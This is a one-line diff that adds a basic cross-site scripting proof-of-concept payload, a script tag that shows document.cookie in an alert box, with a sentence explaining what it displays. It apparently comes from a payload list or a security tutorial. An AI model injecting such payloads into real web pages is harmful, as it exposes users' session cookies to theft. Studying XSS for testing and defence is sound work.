@@ -1,0 +1,1 @@
+<script>alert(document.cookie)</script>       This payload will display the contents of the user's cookie in the alert box.
